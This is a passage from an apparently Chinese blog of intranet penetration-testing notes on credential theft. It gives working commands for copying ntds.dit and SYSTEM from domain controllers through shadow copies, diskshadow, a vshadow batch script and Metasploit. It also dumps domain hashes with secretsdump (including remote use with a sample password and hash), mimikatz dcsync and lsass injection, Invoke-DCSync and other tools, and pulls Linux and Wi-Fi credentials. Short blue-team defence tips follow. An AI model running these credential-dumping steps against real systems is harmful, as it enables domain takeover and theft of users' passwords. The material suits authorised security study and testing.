<p>使用nishang中的Copy-VSS脚本导出 ntds.dit。</p>
<p>nishang中Copy-VSS脚本可以复制SAM文件（如果在域控制器上运行，则还可以复制ntds.dit和SYSTEM）</p>
<p>通过该脚本，可以将 SAM、SYSTEM，ntds.dit 复制到与ps1脚本相同的目录</p>
<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -File Copy-VSS.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="方法五：使用-vssown-vbs-脚本">方法五：使用 vssown.vbs 脚本</h5>
<p>使用 vssown.vbs 脚本提取 ntds.dit</p>
<p>vssown.vbs 脚本的功能和 vssadmin 类似。可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务。</p>
<p>vssown.vbs 脚本下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p>
<pre class="line-numbers language-none"><code class="language-none">#启动卷影拷贝服务
cscript vssown.vbs &#x2F;start

#创建一个C盘的卷影拷贝
cscript vssown.vbs &#x2F;create c

#列出当前卷影拷贝
cscript vssown.vbs &#x2F;list

#复制ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\NTDS\ntds.dit c:\ntds.dit

#删除卷影拷贝
cscript vssown.vbs &#x2F;delete ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>举个例子，如下</p>
<p>创建一个 C 盘的卷影拷贝：</p>
<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;create c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115104543450.png" alt="image-20231115104543450"></p>
<p>列出当前卷影拷贝：</p>
<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115104622434.png" alt="image-20231115104622434"></p>
<p>可以看到存在一个 ID 为 FE084F25-4F38-4C8B-B2D4-3538D5644D15 的卷影拷贝，存储位置为：\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3。</p>
<p>复制 ntds.dit：</p>
<pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit c:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115104657633.png" alt="image-20231115104657633"></p>
<p>删除卷影拷贝：</p>
<pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;delete &#123;FE084F25-4F38-4C8B-B2D4-3538D5644D15&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115104731889.png" alt="image-20231115104731889"></p>
<h5 id="方法六：使用-diskshadow">方法六：使用 diskshadow</h5>
<p>diskshadow.exe支持以下操作系统：</p>
<ul>
<li>Windows Server 2022</li>
<li>Windows Server 2019</li>
<li>Windows Server 2016</li>
<li>Windows Server 2012 R2</li>
<li>Windows Server 2012</li>
<li>Windows Server 2008 R2</li>
<li>Windows Server 2008</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115112849594.png" alt="image-20231115112849594"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115112750938.png" alt="image-20231115112750938"></p>
<p>在渗透中可以使用 diskshadow来执行命令</p>
<p>例如，可以将需要执行的命令exec c:\windows\system32\calc.exe写入C盘目录下的command.txt文件，然后使用diskshadow执行</p>
<pre class="line-numbers language-none"><code class="language-none">echo exec c:\windows\system32\calc.exe&gt;command.txt
diskshadow &#x2F;s c:\command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115113141567.png" alt="image-20231115113141567"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115113105103.png" alt="image-20231115113105103"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115113202857.png" alt="image-20231115113202857"></p>
<p>diskshadow也可以用来导出 ntds.dit</p>
<pre class="line-numbers language-none"><code class="language-none">#将以下代码写入command.txt
#设置卷影拷贝
set context persistent nowriters
#添加卷
add volume c: alias someAlias
#创建快照
create
#分配虚拟磁盘盘符
expose %someAlias% k:
#将ntds.dit复制到c盘中
exec &quot;cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit c:\ntds.dit
#删除所有快照
delete shadows all
#列出系统中的卷影拷贝
list shadows all
#重置
reset
#退出
exit

#加载文本（在C:\windows\system32 目录下执行，不然会出错）
diskshadow &#x2F;s c:\command.txt

#转储 system.hive
reg save hklm\system c:\windows\temp\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115113541348.png" alt="image-20231115113541348"></p>
<blockquote>
<p>system.hive中存放着ntds.dit的密钥，如果没有该密钥，将无法查看ntds.dit中的信息。</p>
</blockquote>
<p>注意事项：</p>
<ul>
<li>在使用diskshadow.exe导出ntds.dit时，必须在C:\Windows\System32中进行操作。</li>
<li>渗透测试人员可以在非特权用户权限下使用 diskshadow.exe 的部分功能。与其他工具相比，diskshadow的使用更为灵活。</li>
<li>脚本执行后，要检查从快照中复制出来的 ntds.dit 文件大小。如果文件大小发生了改变，可以检查或修改脚本后重新执行。</li>
</ul>
<h5 id="方法七：使用msf">方法七：使用msf</h5>
<p>msf 里的 psexec_ntdsgrab 模块可以获取目标的 ntds.dit 和 SYSTEM 文件（原理也是利用了卷影拷贝服务） 并将其传送到攻击机的 /root/.msf4/loot/ 目录下</p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrab
set rhosts 192.168.7.7
set smbdomain teamssix.com
set smbuser administrator
set smbpass 1qaz@WSX
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120132127935.png" alt="image-20231120132127935"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120132152092.png" alt="image-20231120132152092"></p>
<p>除此之外，<mark>在获取到会话后</mark>，也可以用 MSF 提供的 domain_hashdump 模块直接读取 ntds.dit 文件</p>
<pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdump
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>执行后，目标机器上的ntds.dit会被解析，将域账号和域散列值导出并回显</p>
<h5 id="方法八：使用vshadow配合ShadowCopy-bat脚本">方法八：使用vshadow配合ShadowCopy.bat脚本</h5>
<p>ShadowCopy.bat 使用微软的卷影拷贝技术，<mark>能够复制被锁定的文件及被其他程序打开的文件</mark>，代码如下</p>
<pre class="line-numbers language-none"><code class="language-none">setlocal
if NOT &quot;%CALLBACK_SCRIPT%&quot;&#x3D;&#x3D;&quot;&quot; goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER&#x3D;%SystemDrive%
set SOURCE_RELATIVE_PATH&#x3D;windows\ntds\ntds.dit
set DESTINATION_PATH&#x3D;%~dp0
@echo ...Determine the scripts to be executed&#x2F;generated...
set CALLBACK_SCRIPT&#x3D;%~dpnx0
set TEMP_GENERATED_SCRIPT&#x3D;GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
&quot;%~dp0vshadow.exe&quot; -script&#x3D;%TEMP_GENERATED_SCRIPT% -exec&#x3D;&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%
del &#x2F;f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%
reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>创建一个bat脚本写入如上代码，命名为ShadowCopy.bat</p>
</blockquote>
<p>vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a target="_blank" rel="noopener" href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/%E3%80%82Windows">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/。Windows</a> SDK 下载安装完后，找到 vshadow.exe 拿出来（即可以将该文件单独提取出来使用）</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120143811733.png" alt="image-20231120143811733"></p>
<p><mark>将这vshadow.exe和ShadowCopy.bat脚本放到同一个文件夹里后，以管理员权限运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件</mark></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120142814413.png" alt="image-20231120142814413"></p>
<p>之后可以用esentutl修复一下ntds.dit，然后使用QuarksPwDump.exe将域用户哈希读取出来</p>
<pre class="line-numbers language-none"><code class="language-none">esentutl &#x2F;p &#x2F;o ntds.dit
QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120144317711.png" alt="image-20231120144317711"></p>
<p>或者使用其他读取ntds.dit文件的方法也可以</p>
<h5 id="卷影拷贝服务的防御">卷影拷贝服务的防御</h5>
<p>上面很多种方法都使用到了卷影拷贝服务，通过监控卷影拷贝服务的使用情况，可以及时发现攻击者在系统中进行的一些恶意操作，这里给出一些蓝队防御手段：</p>
<ul>
<li>监控卷影拷贝服务及任何涉及活动目录数据库文件(ntds.dit)的可疑操作行为。</li>
<li>监控 System Event ID 7036(卷影拷贝服务进行运行状态的标志)的可疑事例，以及创建 vssvc.exe 进程的事件。</li>
<li>监控创建 diskshadow.exe 及相关子进程的事件。</li>
<li>监控客户端设备中的 diskshadow.exe 实例创建事件。除非业务需要，在Windows操作系统中不应该出现 diskshadow.exe。如果发现，应立刻将其删除。</li>
<li>通过日志监控新出现的逻辑驱动器映射事件。</li>
</ul>
<h4 id="读取ntds-dit文件">读取ntds.dit文件</h4>
<h5 id="方法一：使用NTDSDumpEx读取ntds-dit文件">方法一：使用NTDSDumpEx读取ntds.dit文件</h5>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p>
<pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system.hiv -o domain.txt
#.\NTDSDumpEx.exe -d ntds.dit -s SYSTEM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114175007779.png" alt="image-20231114175007779"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115101531044.png" alt="image-20231115101531044"></p>
<h5 id="方法二：使用impacket里的secretsdump-py脚本读取ntds-dit文件">方法二：使用impacket里的secretsdump.py脚本读取ntds.dit文件</h5>
<pre class="line-numbers language-none"><code class="language-none">#impacket工具包中的impacket-secretsdump命令
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL

#或者直接使用 python 执行 secretsdump.py 文件也可
python3 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
#python3 secretsdump.py -ntds .&#x2F;ntds.dit -system .&#x2F;SYSTEM LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114194624224.png" alt="image-20231114194624224"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114202858576.png" alt="image-20231114202858576"></p>
<p>impacket还可以直接通过用户名和散列值进行验证，从远程登录到域控上读取ntds.dit并转储出散列值</p>
<p>因此，如果在得到域管用户密码或hash情况下，可远程连接导出，如下</p>
<pre class="line-numbers language-none"><code class="language-none">python3 secretsdump.py fox&#x2F;admintests:QWEqwe123@172.16.58.147
或
python3 secretsdump.py fox&#x2F;admintests@172.16.58.147 -hashes aad3b435b51404eeaad3b435b51404ee:621cdf4b49c06ec28caa7a6cab4ebac8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114203231450.png" alt="image-20231114203231450"></p>
<h5 id="方法三：利用mimikatz直接读取-ntds-dit-文件">方法三：利用mimikatz直接读取 ntds.dit 文件</h5>
<p>除了拷贝 ntds.dit 到本地外，mimikatz 也可以直接查看本机的域内用户所有的账号密码(本质上是利用卷影拷贝服务直接读取 ntds.dit 文件)，不过相对于拷贝 ntds.dit 到自己的机器上来说，直接使用 mimikatz 隐蔽性肯定就会差些了。需要注意的是，必须使用域管理员权限运行mimikatz才可以读取ntds.dit</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe

# 直接获取 teamssix 域内所有用户 hash
lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv

# 获取单个用户的详细信息
lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也可以直接在域控制器中运行mimikatz，通过转储 lsass.exe 进程进行 dump 操作</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
lsadump::lsa &#x2F;inject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<blockquote>
<p>如果输出内容太多，可以使用 log 命令，这样操作就都会被记录到文本里了，会在mimikatz目录下生成一个文本文件，用于记录mimikatz的所有执行结果</p>
</blockquote>
<h5 id="方法四：使用Invoke-DCSync-ps1脚本直接读取-ntds-dit-文件">方法四：使用Invoke-DCSync.ps1脚本直接读取 ntds.dit 文件</h5>
<p><mark>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值</mark>。所以可以将Invoke-DCSync.ps1上传到目标机器进行直接读取，不需要将 ntds.dit 拷贝到本地外，和上面的mimikatz是一样的</p>
<p>Invoke-DCSync.ps1 下载地址：<a target="_blank" rel="noopener" href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .&#x2F;Invoke-DCSync.ps1
#这里使用-PWDumpFormat参数，格式化输出，方便查看
Invoke-DCSync -PWDumpFormat
#导出域内所有用户的Hash
Invoke-DCSync -DumForest | ft -wrap -autosize
#导出域内用户的krbtgt的Hash
Invoke-DCSync -DumpForest -Users @(&quot;krbtgt&quot;) | ft -wrap -autosize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120105709710.png" alt="image-20231120105709710"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120105858130.png" alt="image-20231120105858130"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120105402765.png" alt="image-20231120105402765"></p>
<h5 id="方法五：使用QuarksPwDump读取ntds-dit文件">方法五：使用QuarksPwDump读取ntds.dit文件</h5>
<p>先使用windows自带的esentutl修复下ntds.dit文件</p>
<pre class="line-numbers language-none"><code class="language-none">esentutl &#x2F;p &#x2F;o ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114235135967.png" alt="image-20231114235135967"></p>
<p>ntds.dit文件就属于Active Directory 数据库文件</p>
<p>再使用QuarksPwDump.exe进行提取</p>
<pre class="line-numbers language-none"><code class="language-none">.\QuarksPwDump.exe --dump-hash-domain --output userhash.txt --ntds-file .\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115101110613.png" alt="image-20231115101110613"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115101121852.png" alt="image-20231115101121852"></p>
<h5 id="方法六：利用Esedbexport配合ntdsxtract读取ntds-dit文件">方法六：利用Esedbexport配合ntdsxtract读取ntds.dit文件</h5>
<p>安装 esedbexport，这里以 Kali 为例</p>
<pre class="line-numbers language-none"><code class="language-none">apt-get install autoconf automake autopoint libtool pkg-config
wget https:&#x2F;&#x2F;github.com&#x2F;libyal&#x2F;libesedb&#x2F;releases&#x2F;download&#x2F;20210424&#x2F;libesedb-experimental-20210424.tar.gz
tar zxvf libesedb-experimental-20210424.tar.gz
cd libesedb-20210424
.&#x2F;configure
make
make install
ldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用Esedbexport恢复ntds.dit并导出用户表信息（利用Esedbexport可以从.dat文件中转储表格）</p>
<pre class="line-numbers language-none"><code class="language-none">esedbexport -m tables ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>操作时间可能较久，具体看ntds.dit的大小情况，提取成功后，会在同一目录下生成一个ntds.dit.export文件夹，实际上用到的文件就是此文件夹下的datatable.3和link_table.5</p>
</blockquote>
<p>安装 ntdsxtract</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;csababarta&#x2F;ntdsxtract.git
cd ntdsxtract
python setup.py build
python setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 all_user.txt 里</p>
<pre class="line-numbers language-none"><code class="language-none">python2 dsusers.py ntds.dit.export&#x2F;datatable.3 ntds.dit.export&#x2F;link_table.5 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee all_user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可</p>
</blockquote>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119221442271.png" alt="image-20231119221442271"></p>
<p>ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内</p>
<pre class="line-numbers language-none"><code class="language-none">python2 dscomputers.py ntds.dit.export&#x2F;datatable.3 computer_output --csvoutfile all_computers.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="方法七：使用DSInternals读取ntds-dit文件">方法七：使用DSInternals读取ntds.dit文件</h5>
<p>DSInternals 主要功能包括<mark>离线 ntds.dit 文件操作</mark>以及通过目录复制服务（DRS）远程协议查询域控制器。</p>
<p>DSInternals 下载地址：<a target="_blank" rel="noopener" href="https://github.com/MichaelGrafnetter/DSInternals/releases">https://github.com/MichaelGrafnetter/DSInternals/releases</a></p>
<pre class="line-numbers language-none"><code class="language-none">#安装 DSInternals
Install-Module DSInternals -Force

#直接导出 hash，并保存在 output_hash.txt 文件里
$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system&#39;
Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -Bootkey $key | Out-File output_hash.txt

#或者导出 hashcat 支持的 hash，并保存在 output_hashcat.txt 文件里
$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system.hive&#39;
Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="单机密码抓取的防御手段">单机密码抓取的防御手段</h3>
<p>微软为了防止用户密码在内存中以明文形式泄露，发布了补丁KB2871997关闭了Wdigest功能</p>
<p>Windows Server 2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows Server 2012以下版本，如果安装了KB2871997，攻击者同样无法获取明文密码。</p>
<p>在日常网络维护中，通过查看注册表项Wdigest，可以判断Wdigest功能的状态。如果该项的值为1，用户下次登录时，攻击者就能使用工具获取明文密码。应该确保该项的值为0，使用户明文密码不会出现在内存中（这时候使用mimikatz抓取密码，只能获取NTML Hash）。</p>
<p>在命令行环境中开启或关闭Wdigest Auth，有如下两种方法：</p>
<ol>
<li>
<p>使用reg add命令</p>
<pre class="line-numbers language-none"><code class="language-none">#开启Wdigest Auth
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f
#关闭Wdigest Auth
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114143414143.png" alt="image-20231114143414143"></p>
</li>
<li>
<p>使用PowerShell指令</p>
<pre class="line-numbers language-none"><code class="language-none">#开启Wdigest Auth
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Value 1
#关闭Wdigest Auth
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Value 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<p>除此之外，还有以下方法可以防范攻击者抓取明文密码和散列值</p>
<ul>
<li>设置Active Diretory 2012 R2功能级别</li>
</ul>
<p>Windws Sever 2012 R2 新增了一个名为“受保护的用户”的用户组。只要将需要保护的用户放入该组，攻击者就无法使用mimikaz等工具抓取明文密码和散列值了</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115194628173.png" alt="image-20231115194628173"></p>
<ul>
<li>安装KB2871997补丁</li>
</ul>
<p>KB2871997补丁是微软用来解决PsExec或IPC远程查看(ipc$)问题的补丁，<mark>能使本地账号不再被允许远程接入计算机系统，但系统默认的本地管理员账号Administrator 这个SID为500的用户例外——即使将 Administrator改名，该账号的SID仍为500，攻击者仍然可以使用横向攻击方法获得内网中其他计算机的控制权</mark>。安装KB2871997后，仍需禁用默认的Administrator账号，以防御哈希传递攻击。</p>
<ul>
<li>防御mimikatz攻击</li>
</ul>
<p>mimikatz在抓取散列值或明文密码时需要使用Debug权限(因为mimikatz需要和Isass进程进行交互，如果没有Debug权限，mimikatz 将不能读取lsass进程)。因此，可以针对这一点采取防御措施。将拥有Debug权限的本地管理员从Administrators组中删除</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115195631915.png" alt="image-20231115195631915"></p>
<h2 id="Linux系统密码获取">Linux系统密码获取</h2>
<h3 id="MimiPenguin">MimiPenguin</h3>
<p>mimipenguin 是一个简单但是强大的 shell/python 脚本，用来从当前 Linux 桌面用户转储登录凭证（用户名和密码）【mimipenguin 会读取内存中的凭证信息，因为linux系统在运行中会将用户名和密码以明文的方式保存在内存中】，并且已在不同的 Linux 发行版中测试过。</p>
<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p>
<p>使用前提：必须是以root权限执行</p>
<p>使用方法：</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;huntergregal&#x2F;mimipenguin.git
cd mimipenguin

# 使用shell执行
chmod u+x mimipenguin.sh
sudo .&#x2F;mimipenguin.sh

# 使用python执行
chmod u+x mimipenguin.py
sudo python3 .&#x2F;mimipenguin.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240327233215497.png" alt="image-20240327233215497"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240327233425241.png" alt="image-20240327233425241"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240328001753898.png" alt="image-20240328001753898"></p>
<h2 id="已知WIFI密码的获取">已知WIFI密码的获取</h2>
<p>使用自带命令可直接查询</p>
<pre class="line-numbers language-none"><code class="language-none"># 获取登录过的 WIFI 名称
netsh wlan show profiles

# 获取某个连接过的 WIFI 密码
netsh wlan show profile name&#x3D;&quot;teamssix&quot; key&#x3D;clear

# 获取所有连接过的 WIFI 密码
for &#x2F;f  &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114195455535.png" alt="image-20231114195455535"></p>
<h2 id="哈希传递">哈希传递</h2>
